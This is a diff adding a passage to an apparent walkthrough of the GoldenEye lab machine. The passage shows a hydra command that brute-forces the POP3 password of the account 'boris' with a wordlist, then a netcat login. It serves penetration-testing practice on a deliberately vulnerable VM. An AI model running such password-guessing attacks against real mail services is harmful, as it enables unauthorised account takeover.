@@ -99,5 +99,37 @@ I am going to use the `fasttrack.txt` wordlist which contains the password.
 https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/fasttrack/wordlist.txt
 ~~~
 
+Attempting to crack boris account using hydra:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/hydra.png)
+
+~~~
+$ hydra -l boris -P fasttrack.txt -f 10.0.2.10 -s 55007 pop3
+
+-l = username
+-P = password list
+-f = finish when password is found
+-s = custom port
+pop3 = service to crack
+~~~
+
+boris' account cracked:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/boriscracked.png)
+
+We can now connect to pop3 and login using netcat:
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/goldeneye/pop3login.png)
+
+~~~
+USER [username]
+PASS [password]
+
+For a full list of pop3 commands see: https://www.electrictoolbox.com/article/networking/pop3-commands/
+~~~
+
+
+
+
 
 
